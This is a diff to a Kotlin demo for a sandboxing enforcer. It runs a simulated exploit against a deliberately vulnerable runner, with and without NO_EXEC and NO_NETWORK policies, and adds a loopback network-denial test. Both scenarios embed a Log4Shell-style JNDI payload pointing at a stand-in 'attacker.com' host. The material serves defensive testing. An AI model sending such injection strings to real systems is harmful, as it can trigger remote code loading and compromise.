@@ -1,89 +1,110 @@
 package demo
 
-import io.mazewall.enforcer.api.ContainmentViolationException
 import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
 import kotlin.system.exitProcess
 
 fun main(args: Array<String>) {
     val mode = args.getOrNull(0) ?: "all"
-    val report = when (mode) {
-        "unsafe" -> DemoReport(listOf(runUnsafe()))
-        "safe" -> DemoReport(listOf(runSafe()))
-        "profile" -> runProfileAndEnforce()
-        "both" -> {
-            println("Note: 'both' mode runs unsafe + safe only. Use 'all' for the complete demonstration.")
-            println("=== Running in UNSAFE mode ===")
-            val unsafe = runUnsafe()
-            println("\n=== Running in SAFE mode ===")
-            DemoReport(listOf(unsafe, runSafe()))
-        }
-        "all" -> {
-            println("=== Running in UNSAFE mode ===")
-            val unsafe = runUnsafe()
-            println("\n=== Running in SAFE mode ===")
-            val safe = runSafe()
-            println()
-            DemoReport(listOf(unsafe, safe) + runProfileAndEnforce().results)
-        }
+    when (mode) {
         "--help", "-h", "help" -> {
             printHelp()
             return
         }
+        "unsafe", "safe", "profile", "both", "all" -> Unit
         else -> {
             println("Unknown mode: '$mode'. Run with --help for usage.")
             exitProcess(1)
         }
     }
+    val report = runDemo(mode)
     println("\n${report.summary()}")
-    if (!report.passed) exitProcess(2)
+    if (report.exitCode != 0) exitProcess(report.exitCode)
+}
+
+internal fun runDemo(
+    mode: String,
+    unsafe: () -> ScenarioResult = ::runUnsafe,
+    safe: () -> List<ScenarioResult> = { listOf(runSafe(), runNoNetwork()) },
+    profile: () -> DemoReport = ::runProfileAndEnforce,
+): DemoReport = try {
+    when (mode) {
+        "unsafe" -> DemoReport(listOf(unsafe()))
+        "safe" -> DemoReport(safe())
+        "profile" -> profile()
+        "all", "both" -> DemoReport(listOf(unsafe()) + safe())
+        else -> throw IllegalArgumentException("Unknown demo mode: $mode")
+    }
+} catch (failure: Exception) {
+    rethrowFatalOrRestoreInterruption(failure)
+    DemoReport(listOf(ScenarioResult(mode, ExpectedResult.ALLOWED, ScenarioOutcome.InfrastructureFailure(failure))))
 }
 
 internal fun runUnsafe(): ScenarioResult = DemoFixture.create("unsafe").use { fixture ->
     println("\u001b[31;1m[STATUS] BEHAVIORAL PROTECTION: INACTIVE\u001b[0m")
     println("Context: A vulnerable library receives a malicious payload.")
     val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
-    val outcome = runCatching { UnsafeRunner.run(payload) }.fold(
-        onSuccess = {
-            if (fixture.marker.exists()) {
-                println("\u001b[31;1m[SECURITY ALERT] SYSTEM COMPROMISED!\u001b[0m")
-                ScenarioOutcome.Completed("attack created its marker")
-            } else {
-                ScenarioOutcome.InfrastructureFailure(IllegalStateException("exploit returned without creating its marker"))
-            }
-        },
-        onFailure = ScenarioOutcome::InfrastructureFailure,
-    )
-    ScenarioResult("unprotected exploit", ExpectedResult.ALLOWED, outcome)
+    observeScenario("unprotected exploit", ExpectedResult.ALLOWED) {
+        UnsafeRunner.run(payload)
+        check(fixture.marker.exists()) { "exploit returned without creating its marker" }
+        "attack created its marker"
+    }
 }
 
 internal fun runSafe(): ScenarioResult = DemoFixture.create("safe").use { fixture ->
     println("\u001b[32;1m[STATUS] BEHAVIORAL PROTECTION: ACTIVE\u001b[0m")
     println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
     val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
-    val observed = try {
+    val observed = observeScenario("protected exploit", ExpectedResult.DENIED) {
         SafeRunner.run(payload)
-        ScenarioOutcome.Completed("attack returned")
-    } catch (failure: ContainmentViolationException) {
-        val diagnostic = ContainmentViolationDetector.diagnose(failure)
-            ?: return@use ScenarioResult(
-                "protected exploit",
-                ExpectedResult.DENIED,
-                ScenarioOutcome.InfrastructureFailure(failure),
-            )
-        classifyContainmentFailure(failure)
-    } catch (failure: Throwable) {
-        ScenarioOutcome.InfrastructureFailure(failure)
+        "attack returned"
     }
-    val outcome = if (fixture.marker.exists()) ScenarioOutcome.Completed("attack created its marker") else observed
-    ScenarioResult("protected exploit", ExpectedResult.DENIED, outcome)
+    if (fixture.marker.exists()) observed.copy(outcome = ScenarioOutcome.Completed("attack created its marker")) else observed
 }
 
 internal fun classifyContainmentFailure(failure: Throwable): ScenarioOutcome {
+    rethrowFatalOrRestoreInterruption(failure)
     val diagnostic = ContainmentViolationDetector.diagnose(failure)
     return if (diagnostic?.evidence == io.mazewall.enforcer.api.ContainmentViolationEvidence.OBSERVED_POLICY_DENIAL) {
         ScenarioOutcome.Denied(diagnostic.evidence.name)
     } else {
         ScenarioOutcome.InfrastructureFailure(failure)
+    }
+}
+
+internal fun rethrowFatalOrRestoreInterruption(failure: Throwable) {
+    var current = failure
+    val seen = java.util.Collections.newSetFromMap(java.util.IdentityHashMap<Throwable, Boolean>())
+    while (seen.add(current)) {
+        when (current) {
+            is Error -> throw current
+            is InterruptedException -> {
+                Thread.currentThread().interrupt()
+                return
+            }
+            is java.util.concurrent.ExecutionException,
+            is java.util.concurrent.CompletionException,
+            is java.lang.reflect.InvocationTargetException,
+            -> current = current.cause ?: return
+            else -> return
+        }
+    }
+}
+
+internal fun runNoNetwork(): ScenarioResult {
+    val loopback = java.net.InetAddress.getLoopbackAddress()
+    return java.net.ServerSocket(0, 1, loopback).use { listener ->
+        listener.soTimeout = 2_000
+        // Establish that the exact destination is reachable before applying NO_NETWORK.
+        java.net.Socket(loopback, listener.localPort).use { listener.accept().close() }
+        observeScenario("NO_NETWORK loopback control", ExpectedResult.DENIED) {
+            SafeRunner.runContained {
+                java.net.Socket().use { socket ->
+                    socket.connect(java.net.InetSocketAddress(loopback, listener.localPort), 2_000)
+                }
+                "network connection escaped"
+            }
+            "network connection escaped"
+        }
     }
 }
 
@@ -97,8 +118,8 @@ private fun printHelp() {
           safe     Run it with NO_EXEC + NO_NETWORK; kernel denial is expected.
           profile  Profile, enforce, and run positive and negative controls.
                    The native file probe is synchronous; io_uring is not exercised.
-          all      Run every mode (default).
-          both     Run unsafe + safe only.
+          all      Run unsafe + safe controls (default); profiling is explicit.
+          both     Alias for all.
           --help   Show this message.
         """.trimIndent(),
     )
